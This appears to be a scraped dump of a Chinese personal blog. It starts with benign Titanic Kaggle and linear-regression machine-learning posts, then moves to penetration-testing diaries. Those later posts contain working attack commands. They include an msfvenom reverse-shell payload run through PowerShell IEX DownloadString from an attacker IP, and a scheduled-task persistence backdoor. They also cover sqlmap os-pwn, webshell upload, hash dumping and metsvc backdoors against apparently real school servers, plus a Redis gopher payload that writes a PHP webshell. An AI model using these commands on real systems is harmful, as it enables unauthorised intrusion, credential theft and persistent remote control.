可以看到age字段缺失了比较多，fare和embarked(登船地点)缺了几个，cabin(舱号)缺了非常多。感觉少的可以用众数中位数之类的补齐，年龄可以用其他特征拟合，至于缺了三分之二的舱号还是换个方法用吧。之后可以先计算下各个特征的IV值，看一下哪些对结果影响比较大 12345678910111213train &lt;- read_csv(&#x27;train.csv&#x27;)all_iv &lt;- data.frame(vars=colnames(train), iv=numeric(length(colnames(train))), strength=character(length(colnames(train))), stringsAsFactors = F)for (i in colnames(train))&#123; all_iv[all_iv$vars==i,]$iv &lt;- IV(X=factor(train[[i]]), Y=train$Survived) all_iv[all_iv$vars==i,]$strength &lt;- attr(IV(X=factor(train[[i]]), Y=train$Survived),&quot;howgood&quot;) &#125;(all_iv&lt;-all_iv[order(-all_iv$iv),] ) 看到影响最大的是性别，很好理解，第二个因素是船票的价格emmm，有钱真好。还有就是Pclass也就是几号舱，年龄也有很大影响，小孩应该会先走，其他影响都不大。直观的观察下各个特征与生存情况的关系，先定义一个画图的函数： 123456789101112mpl.rcParams[&#x27;font.sans-serif&#x27;] = [&#x27;SimHei&#x27;]//显示中文def survivedFactorPlot(data_train,col,k=&#x27;bar&#x27;): Survived_0 = data_train[col][data_train.Survived == 0].value_counts() Survived_1 = data_train[col][data_train.Survived == 1].value_counts() df=pd.DataFrame(&#123;u&#x27;未获救&#x27;:Survived_0,u&#x27;获救&#x27;:Survived_1&#125;) df.plot(kind=k) plt.title(f&quot;各&#123;col&#125;幸存人数&quot;) plt.xlabel(col) plt.ylabel(u&quot;人数&quot;) plt.show()survivedFactorPlot(data_train,&#x27;Sex&#x27;)survivedFactorPlot(data_train,&#x27;Pclass&#x27;) 看下性别的影响，女性生还率特别高 然后是一号舱也是正相关 c港口登船的活下来的多一些 不过对于ticket和name两个字段也可以废物处理一下，虽然基本是没有规律的，但也有有规律的部分，比如名字中间的称呼可以提取出来，而ticket可以用来看看有没有用同一张联票的，这些人可能会在一起。 大致把称呼分成五个类，有些类别人数很少生还率差不多的就合并了 然后观察联票对生还率的影响，明显有联票的高一些，无依无靠还是很危险的 至于cabin字段，因为是否有记录本身也反映了一定信息，可能人死了就不知道具体船舱了。所以把无记录定义为一类，其他类根据第一个字母来划分。 可以看到有记录的里面大部分还是活下来的多。还有两个字段关于子女数兄弟数的，看了下趋势是相同的，合并成一个family字段，总体就是适中的生还率高，太少或者太多都有不利影响。 最后拟合年龄，选择用随机森林，当时想的是这个比较复杂，可能效果会比较好，其实也未必。 123456789101112131415161718192021222324252627from sklearn.ensemble import RandomForestRegressordef set_missing_ages(df,cols): # 把已有的数值型特征取出来丢进Random Forest Regressor中 age_df = df[cols] # 乘客分成已知年龄和未知年龄两部分 known_age = age_df[age_df.Age.notnull()].as_matrix() unknown_age = age_df[age_df.Age.isnull()].as_matrix() # y即目标年龄 y = known_age[:, 0] # X即特征属性值 X = known_age[:, 1:] # fit到RandomForestRegressor之中 rfr = RandomForestRegressor(random_state=0, n_estimators=2000, n_jobs=-1) rfr.fit(X, y) # 用得到的模型进行未知年龄结果预测 predictedAges = rfr.predict(unknown_age[:, 1::]) # 用得到的预测结果填补原缺失数据 df.loc[ (df.Age.isnull()), &#x27;Age&#x27; ] = predictedAges return df, rfr 然后fare和embarked的缺失值用中位数众数之类的填一下就行，缺的不是太多。这样特征基本就处理好了，下一步就是选择用什么模型。因为是一个二分类问题，决定比较朴实的选择用逻辑回归做。那么对分类特征进行one-hot编码方便回归运算。然后把连续数值标准化，避免不收敛。标准化的时候应该把训练集和测试集分开，不然会有信息泄露。编码和标准化都有现成的方法，很简单。直接逻辑回归算一下训练集准确率，看看有没有欠拟合 1234567891011from sklearn import linear_model# 用正则取出我们要的属性值train_np = data_dummies[:891].as_matrix()# y即第0列：Survival结果y = np.array(data_train.Survived)# X即第1列及以后：特征属性值X = train_np# fit到LogisticRegression之中clf = linear_model.LogisticRegression(C=1.0, penalty=&#x27;l1&#x27;, tol=1e-6)clf.fit(X, y)sum(clf.predict(X)==y)/X.shape[0] 10.8406285072951739 还不错，要是运气好点可能测试集也能有个80的准确率？(想多了)然后计算测试集，结果存到csv，提交kaggle。结果是0.77511针对训练好的模型可以做一下交叉验证，看看有没有明显的过拟合，这里还有个现成的可以画图的函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import numpy as npimport matplotlib.pyplot as plt# from sklearn.learning_curve import learning_curve 修改以fix learning_curve DeprecationWarningfrom sklearn.model_selection import learning_curve# 用sklearn的learning_curve得到training_score和cv_score，使用matplotlib画出learning curvedef plot_learning_curve(estimator, title, X, y, ylim=None, cv=None, n_jobs=1, train_sizes=np.linspace(.05, 1., 20), verbose=0, plot=True): &quot;&quot;&quot; 画出data在某模型上的learning curve. 参数解释 ---------- estimator : 你用的分类器。 title : 表格的标题。 X : 输入的feature，numpy类型 y : 输入的target vector ylim : tuple格式的(ymin, ymax), 设定图像中纵坐标的最低点和最高点 cv : 做cross-validation的时候，数据分成的份数，其中一份作为cv集，其余n-1份作为training(默认为3份) n_jobs : 并行的的任务数(默认1) &quot;&quot;&quot; train_sizes, train_scores, test_scores = learning_curve( estimator, X, y, cv=cv, n_jobs=n_jobs, train_sizes=train_sizes, verbose=verbose) train_scores_mean = np.mean(train_scores, axis=1) train_scores_std = np.std(train_scores, axis=1) test_scores_mean = np.mean(test_scores, axis=1) test_scores_std = np.std(test_scores, axis=1) if plot: plt.figure() plt.title(title) if ylim is not None: plt.ylim(*ylim) plt.xlabel(u&quot;训练样本数&quot;) plt.ylabel(u&quot;得分&quot;) plt.gca().invert_yaxis() plt.grid() plt.fill_between(train_sizes, train_scores_mean - train_scores_std, train_scores_mean + train_scores_std, alpha=0.1, color=&quot;b&quot;) plt.fill_between(train_sizes, test_scores_mean - test_scores_std, test_scores_mean + test_scores_std, alpha=0.1, color=&quot;r&quot;) plt.plot(train_sizes, train_scores_mean, &#x27;o-&#x27;, color=&quot;b&quot;, label=u&quot;训练集上得分&quot;) plt.plot(train_sizes, test_scores_mean, &#x27;o-&#x27;, color=&quot;r&quot;, label=u&quot;交叉验证集上得分&quot;) plt.legend(loc=&quot;best&quot;) plt.draw() plt.gca().invert_yaxis() plt.show() midpoint = ((train_scores_mean[-1] + train_scores_std[-1]) + (test_scores_mean[-1] - test_scores_std[-1])) / 2 diff = (train_scores_mean[-1] + train_scores_std[-1]) - (test_scores_mean[-1] - test_scores_std[-1]) return midpoint, diffplot_learning_curve(clf, u&quot;学习曲线&quot;, X, y) 看着还可以。其实逻辑回归我也不知道还能调点什么，也就是再细分特征了，但感觉这已经很细了。。。所以还是大力出奇迹吧，做个boost、bagging啥的模型融合，应该会有进步 12345678from sklearn.ensemble import BaggingRegressor# fit到BaggingRegressor之中clf1 = linear_model.LogisticRegression(C=1.0, tol=1e-6)bagging_clf = BaggingRegressor(clf1, n_estimators=20, max_samples=0.8, max_features=1.0, bootstrap=True, bootstrap_features=False, n_jobs=-1)bagging_clf.fit(X, y)predictions = bagging_clf.predict(data_dummies[891:])result = pd.DataFrame(&#123;&#x27;PassengerId&#x27;:data_test[&#x27;PassengerId&#x27;].as_matrix(), &#x27;Survived&#x27;:predictions.astype(np.int32)&#125;)result.to_csv(&quot;bagging2.csv&quot;, index=False) 因为我特征调了很多次，有时候bagging后结果有进步，有时候反倒下降了，感觉并不是万能的，还是跟特征选取有关。这里之后就没有什么好办法改进，试了好几种模型，准确率都在75、76徘徊。从这张图上看还没有单纯只靠性别分准确率高，日 最后用到了gradientboosting梯度提升树，并且进行了艰苦的(玄学)调参，大部分时间也就跟逻辑回归一个结果。最后终于得到了进步，准确率到了0.799，排名1473/10113，排14.5% 折腾到这觉得可以告一段落了，就去看了看别人的kernel，结果发现了一些比较牛逼的东西简单的分析最明显的特征，一个是性别，一个是pclass，还有一个是embarked。所以用一个手写的三层决策树(其实就是三个if)就可以做个简单预测：先判断所有男性都没活下来因为大部分女性都活了，但pclass=3的大部分人都死了，所以判断pclass!=3的女性都活了然后对于pclass=3的，因为embarked=s的大部分人都死了，所以判断embarked!=s的女性都活了其实也就是假设男性都死。女性除了pclass=3&amp;&amp;embarked=s的，都活。 123data_train[&#x27;Surv&#x27;] = 0data_train.loc[(data_train.Sex==&#x27;female&#x27;)&amp;(data_train.Pclass!=3),&#x27;Surv&#x27;] = 1data_train.loc[(data_train.Sex==&#x27;female&#x27;)&amp;(data_train.Pclass==3)&amp;(data_train.Embarked!=&#x27;S&#x27;),&#x27;Surv&#x27;] = 1 这么两行的准确率是多少呢？0.7799(微笑)还有一个准确率83还是85的模型，他只判断了两件事，一个是性别，另外就是这个人一家的人的生还状况(可以从name字段判断)。毕竟一家人就是要整整齐齐。所以可以看出来，最重要的还是特征分析这步，再牛逼的模型也没办法代替人来提取相关的信息。因为人可以从正向来进行思考，当这件事发生的时候，当时的人是怎么做决策的，是不是会女士优先，小孩先走，一家人互相帮助，同生共死。而机器和模型只能从已有的数据中以偏概全的去还原。这点倒是挺值得思考的。 参考链接：https://www.kesci.com/home/project/5bfe39b3954d6e0010681cd1https://www.kaggle.com/ldfreeman3/a-data-science-framework-to-achieve-99-accuracyhttps://www.kaggle.com/mauricef/titanic","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"线性回归练习--李宏毅机器学习hw1","slug":"线性回归练习-李宏毅机器学习hw1","date":"2019-02-26T14:55:53.000Z","updated":"2019-02-27T01:25:22.000Z","comments":true,"path":"2019/02/26/线性回归练习-李宏毅机器学习hw1/","link":"","permalink":"http://yoursite.com/2019/02/26/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E7%BB%83%E4%B9%A0-%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0hw1/","excerpt":"以前总说安全是不产生价值的岗位，结果现在又往一样不产生价值的数据分析里跳，谁让这玩意火呢。最近看机器学习，看的也不快，做个题熟悉一下，还是有不了解的东西，虽然只是个最简单的线性回归。","text":"以前总说安全是不产生价值的岗位，结果现在又往一样不产生价值的数据分析里跳，谁让这玩意火呢。最近看机器学习，看的也不快，做个题熟悉一下，还是有不了解的东西，虽然只是个最简单的线性回归。题目大概就是用18个指标预测第10小时pm2.5的值，介绍在https://ntumlta.github.io/2017fall-ml-hw1/首先想的就是最简单的，只用pm2.5一个特征来预测，每天的分开算，这样就是从训练集每天取九个特征加一个答案有24-9=15种取法，一个月20天，12个月，一共122015=3600行，9列 12345678910111213train_data = pd.read_csv(&#x27;train.csv&#x27;,encoding = &#x27;BIG5&#x27;)pm25list = train_data[train_data[&#x27;測項&#x27;]==&#x27;PM2.5&#x27;].iloc[:,3:]x_tmp = []y_tmp = []for i in range(15): tempx = pm25list.iloc[:,i:i+9] tempx.columns=np.array(range(9)) x_tmp.append(tempx) y_tmp.append(pm25list.iloc[:,i+9])x = pd.concat(x_tmp)y = pd.concat(y_tmp)x_data = np.array(x,float)y_data = np.array(y,float) 训练数据找好了，写个线性回归的函数，先用正规解算着，一会再跟梯度下降的对比。 1234567891011121314151617181920class LinearRegression1(): def __init__(self): self.coef_ = None self.interception_ = None self._theta = None def fit_normal(self,X_train,Y_train): X_b = np.c_[np.ones((X_train.shape[0],1)),X_train] self._theta = np.linalg.inv(X_b.T.dot(X_b)).dot(X_b.T).dot(Y_train) self.coef_ = self._theta[1:] self.interception_ =self._theta[0] return self def predict(self,X_predict): assert self.coef_ is not None and self.interception_ is not None,\\ &quot;must fit before predict&quot; X_b = np.c_[np.ones((X_predict.shape[0],1)),X_predict] return X_b.dot(self._theta) def __repr__(self): return &quot;LinearRegression1()&quot; 代入模型求解，系数向量有9个特征加上一个b，一共十维 123pmlrg = LinearRegression1()pmlrg.fit_normal(x_data,y_data)pmlrg._theta 题目有kaggle链接，虽然不能参加但是能看到得分，用的是均方根误差，定义一个 1234def RMSE(predict, answer): rmse = np.sqrt(np.sum((predict - answer)**2) /predict.shape[0]) return rmse 计算一下和标准答案之间的RMSE6.661983418013117这么高，看别人都是5点多。想怎么改进一下，最简单的想法就是__加 大 力 度__把18个指标全都用上，跨天取值。这样读数据就比较麻烦了，因为每个月只有20天的数据，所以不能跨月。这样就有12个月，每个月一共有20天*24小时。特征依然是九个小时，取连续9小时的话最后九个小时取不了，所以每月有20*24-9=471种，12个月有12*471=5652种。然后是列向量，只用pm2.5一个指标的时候是9个特征，现在18个指标就是18*9=162个特征。所以x是一个5652*162的矩阵，代表一共取了5652个[九小时]，这个[九小时]里每个小时的每个污染指标都作为一个特征y就是5652个[第十小时] 1234567891011121314151617181920212223rawdata = pd.read_csv(&#x27;train.csv&#x27;,encoding = &#x27;BIG5&#x27;).iloc[:,3:]data = [[] for x in range(18)]for i in range(rawdata.shape[0]): if i%18 == 10: for d in [float(0) if x==&#x27;NR&#x27; else x for x in rawdata.iloc[i] ]: data[i%18].append(float(d)) else: for d in rawdata.iloc[i]: data[i%18].append(float(d))x = [[] for i in range(12*471)]y = []# 每 12 個月for i in range(12): # 一個月取連續10小時的data可以有471筆 for j in range(471): # 18種污染物 for t in range(18): # 連續9小時 for s in range(9): x[471*i+j].append(data[t][480*i+j+s] ) y.append(data[9][480*i+j+9])x = np.array(x)y = np.array(y) 训练 12reg = LinearRegression1()reg.fit_normal(x,y) 之后读取测试集，也不能简单的只读pm2.5的行了，一共240天，每天都是18*9=162，和训练的模型一个维度 12345678910111213testdata = pd.read_csv(&#x27;test.csv&#x27;,encoding = &#x27;BIG5&#x27;,header=None).iloc[:,2:]xte = [[] for i in range(12*20)]for i in range(testdata.shape[0]): if i%18 == 10: for d in [float(0) if x==&#x27;NR&#x27; else x for x in testdata.iloc[i] ]: xte[i//18].append(d) else: for d in testdata.iloc[i]: xte[i//18].append(d)allpredict = reg.predict(xte)rmseall = RMSE(allpredict , answer)rmseall 6.570013915501879尼玛就进步了这么一点点，大力也没出奇迹啊。","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"windows持续控制","slug":"windows持续控制","date":"2017-05-21T11:44:18.000Z","updated":"2019-07-06T03:31:10.000Z","comments":true,"path":"2017/05/21/windows持续控制/","link":"","permalink":"http://yoursite.com/2017/05/21/windows%E6%8C%81%E7%BB%AD%E6%8E%A7%E5%88%B6/","excerpt":"前一阵子的勒索病毒没传进学校，所以大家还是开开心心以为很安全，ms17010的洞也可以开开心心继续玩了。","text":"前一阵子的勒索病毒没传进学校，所以大家还是开开心心以为很安全，ms17010的洞也可以开开心心继续玩了。不过学校的服务器是加强了防御，正好当时在香港看geekpwn，回来发现大清亡了233。 打江山易守江山难，研究了一下常见的权限控制方法。 powersploit1msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ip LPORT=4444 -f powershell -o /var/www/html/test 先生成一个payload 123IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.110.129/CodeExecution/Invoke-Shellcode.ps1&quot;)IEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.110.129/test&quot;)Invoke-Shellcode -Shellcode ($buf) 执行这三条反弹一个meterpreter 有可能执行失败，显示没有脚本权限，在管理员权限下执行 1set-ExecutionPolicy RemoteSigned 然后是后门 123$upo = new-userpersistenceoption -scheduledtask -OnIdle$epo = new-elevatedpersistenceoption -scheduledtask -OnIdleadd-persistence -filepath .\\meter_443.ps1 -elevatedpersistenceoption $epo -userpersistenceoption $upo 这几条命令生成一个Persistence.ps1，放到目标上执行就会写进计划任务，这是闲时，也可以hourly。理论上可以从web加载，那就方便不少，但我现在下载运行会报错，感觉很难用。","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"aspx站从注入到拉闸","slug":"aspx站从注入到拉闸","date":"2017-04-06T14:42:06.000Z","updated":"2019-02-23T09:32:18.000Z","comments":true,"path":"2017/04/06/aspx站从注入到拉闸/","link":"","permalink":"http://yoursite.com/2017/04/06/aspx%E7%AB%99%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0%E6%8B%89%E9%97%B8/","excerpt":"偶遇北科第一黑找了个叫自助管理系统的站，以为是个重要系统，先扫端口。发现8080有个sqlwebservice，并不会用。回头wvs扫主站没想到登陆框直接有个post注入。","text":"偶遇北科第一黑找了个叫自助管理系统的站，以为是个重要系统，先扫端口。发现8080有个sqlwebservice，并不会用。回头wvs扫主站没想到登陆框直接有个post注入。burp抓登陆包保存在sqlmap目录下1.txt 1sqlmap.py -r 1.txt 跑数据的时候还很小心的加上了start和end，结果只有4条- - 除了admin其他三个还都是未激活的。 空欢喜，欺骗消费者。就是个管自主打印机的，前两天终端机收了个打印机，这又来一个，犯冲。 提权aspx自然是搭配mssql数据库，好东西，而且权限贼高，其实看这么薄弱的安全意识就应该想到不是啥有用的系统。直接sqlmap的os-shell，连绝对路径都不需要就返回了shell。找了找路径想传个大马，但是乱码，加–charset=gbk也没用。干脆用kali下的sqlmap，解决了乱码。反正都用kali了，干脆直接上msf了，os-pwn返回一个meterpreter 1--os-pwn --msf-path /usr/share/metasploit-framework/ --priv-esc -v 1 之后ps+migrate到别的进程省得断线。之后找了下绝对路径。 1search -f login.aspx 然后虚拟机网就断了。无聊就本机sqlmap –file-write –file-dst写了大马，网好了回kali接着搞，又开了个meterpreter，hashdump抓密码，看一下也没有360啥的，开了个metsvc后门 他们大马找了termservice端口 12tasklist /svcnetstat /ano 看到是3389改到了1951，建用户开远程连上去互相吹牛逼了。 尾声想的是metsvc开的31337以后直接连就可以了。 然而北科第一拉闸王把站拉黑了╮(╯▽╰)╭ GG 后续","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"openvasa使用排坑","slug":"openvasa使用排坑","date":"2017-03-06T04:03:44.000Z","updated":"2017-03-06T04:48:54.000Z","comments":true,"path":"2017/03/06/openvasa使用排坑/","link":"","permalink":"http://yoursite.com/2017/03/06/openvasa%E4%BD%BF%E7%94%A8%E6%8E%92%E5%9D%91/","excerpt":"学校实验课，给分了个openvas使用，本来以为打开用就行了，开源的东西还有点麻烦。不过反正也没用过这种大扫描器，最多用wvs，学一下看看好不好用。等什么时候也用过nessus对比一下。kali下面是直接安装好的，不过要配置。首先配置证书","text":"学校实验课，给分了个openvas使用，本来以为打开用就行了，开源的东西还有点麻烦。不过反正也没用过这种大扫描器，最多用wvs，学一下看看好不好用。等什么时候也用过nessus对比一下。kali下面是直接安装好的，不过要配置。首先配置证书 12root@kali:~# cd /usr/share/openvas/root@kali:/usr/share/openvas# openvas-mkcert 不用配置一路enter就可以 然后更新程序数据库，包括漏洞库之类的。 1root@kali:/usr/share/openvas# openvas-nvt-sync 这里最开始我会卡在md5校验那，后来去图书馆的时候就好了，开始怀疑是网站在墙外，不过应该只是跟网络状态有关系。 然后是创建用户 1openvas-mkcert-client -n om -i 这里前面都正常，最后一步失败了，显示have to copy by hands什么的，查了半天也没太明白，后来解决方法是openvas-setup这个命令会指引下一步干嘛，照着敲就行了 然后重建数据库,加载插件 1234root@kali:/usr/share/openvas# openvasmd –-rebuildroot@kali:/usr/share/openvas# openvassdroot@kali:/usr/share/openvas# openvasmd --rebuildroot@kali:/usr/share/openvas# openvasmd –backup 创建用户，网上的可能是版本不对 1oot@kali:~# openvasmd --create-user admin --role Admin 这样会创建一个admin，密码是程序随机生成的，登陆上去可以改 然后配置端口就可以从浏览器访问了 123openvasmd -p 9390 -a 127.0.0.1openvasmd -a 127.0.0.1 -p 9393gsad --http-only --listen=127.0.0.1 -p 9392 扫描就没什么太多说的，拿鼠标点就行了。","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"服务器卡权限绕过","slug":"服务器卡权限的绕过","date":"2017-03-01T14:47:57.000Z","updated":"2019-02-23T10:11:56.000Z","comments":true,"path":"2017/03/01/服务器卡权限的绕过/","link":"","permalink":"http://yoursite.com/2017/03/01/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E6%9D%83%E9%99%90%E7%9A%84%E7%BB%95%E8%BF%87/","excerpt":"昨天桥西发了一个系统，漏洞奇多。JSP+MYSQL，登陆界面有注入，注入后发现有弱密码账号密码都是1。想有没有办法拿个shell什么的。先是试了sqlmap的os-shell，基本用不了。上传不了文件，命令差不多只能执行dir。然后想还是sqlmap，用file-write写个大马小马，但是写过去都有问题，解析不出来。","text":"昨天桥西发了一个系统，漏洞奇多。JSP+MYSQL，登陆界面有注入，注入后发现有弱密码账号密码都是1。想有没有办法拿个shell什么的。先是试了sqlmap的os-shell，基本用不了。上传不了文件，命令差不多只能执行dir。然后想还是sqlmap，用file-write写个大马小马，但是写过去都有问题，解析不出来。后来北科大第一黑客直接上wvs扫除200多个高危，不过都是struts开发模式。发现有struts02016远程命令执行。在login.jsp不行，需要在Login.action不是很懂。但是也很蛋疼，执行不了几个命令。大致看了下，有whoami显示是system，system你还啥也干不了…net user显示有administrator和guest。net user /add失败。net user guest失败。目录页切换不了。因为传不了文件，感觉提权也没啥希望。后来随便试了几下发现可以net user guest /active:yes激活了guest，然后net user 一下发现没有密码。直接3389连过去。win2012的系统，mimikataz抓不出明文，hash解不出来，没什么办法。权限卡的很严，不能创建账户，很多目录写权限都没有，版本很新没找到提权poc。发现在域下，也许可以上cain扩大战果。不过已经找到不少东西了。掌控雷电指日可待，虽然没什么技术含量，东西还是不少。—————————————GG——————————————–第二天老王上去玩想用注册表改权限，结果把administrator的密码复制到guest下了。场面一度十分绝望。后来发现他玩脱之前把创建用户的权限开放了，大马一开始net user ustb ustb /add 失败。结果发现可以直接net user ustb /add但是加不了密码。想起来以前用win2012时候密码强度有要求，改了个麻烦的成功了。总之增加游戏难度也算是成功了，过一阵子有空试试来一波域渗透。","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"终于学一下ssrf","slug":"终于学一下ssrf","date":"2017-02-03T02:40:44.000Z","updated":"2017-02-05T04:52:10.000Z","comments":true,"path":"2017/02/03/终于学一下ssrf/","link":"","permalink":"http://yoursite.com/2017/02/03/%E7%BB%88%E4%BA%8E%E5%AD%A6%E4%B8%80%E4%B8%8Bssrf/","excerpt":"说什么一周一篇都是扯淡- -，拖延症拖啊拖啊拖。ssrf这个概念好久前就知道，但一直没有实际操作过，这次拿i春秋的两道题学一下。","text":"说什么一周一篇都是扯淡- -，拖延症拖啊拖啊拖。ssrf这个概念好久前就知道，但一直没有实际操作过，这次拿i春秋的两道题学一下。 parameters在do=main页面有一个输入框，随便输点什么会提示协议或后缀不对，根据套路应该是ssrf。然后发现限制了协议是http，后缀是图片。因为协议被限制了，所以不能直接file://读文件，但可以通过在自己服务器上放一个用来跳转的php文件。内容是 1header(&quot;Location:$_GET[&#x27;a&#x27;]&quot;); 然后访问302.php?a=file:///var/www/html/index.php读主页的源码。不过这里的问题是后缀被限制成图片。所以在自己的服务器上配置.htaccess,把jpg解析为php 1AddType application/x-httpd-php jpg 访问http://ctf.ever404.com/302.jpg?a=file:///var/www/html/index.php后面的部分比较奇葩了，读取了数据库的存储文件ibdata1拿到了密码 ###cat这道题是过滤了内网ip，同样通过跳转。http://ctf.ever404.com/1.php?1.jpg即可。看writeup扫端口，80很快，6379超时。根据套路猜是redis未授权。禁用了http和https，利用gopher写shell就行了。 1header(&#x27;Location: gopher://127.0.0.1:6379/___%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%68%61%6f%7a%69%31%2e%70%68%70%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%0d%0a%73%65%74%20%36%36%36%20%22%3c%3f%70%68%70%20%24%5f%47%45%54%5b%61%5d%28%24%5f%47%45%54%5b%62%5d%29%3b%3f%3e%22%0d%0a%73%61%76%65%0d%0a%65%78%69%74%0d%0a&#x27;);","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://yoursite.com/tags/java%E5%AE%89%E5%85%A8/"},{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"挖洞","slug":"挖洞","permalink":"http://yoursite.com/tags/%E6%8C%96%E6%B4%9E/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"},{"name":"机器学习","slug":"机器学习","permalink":"http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]}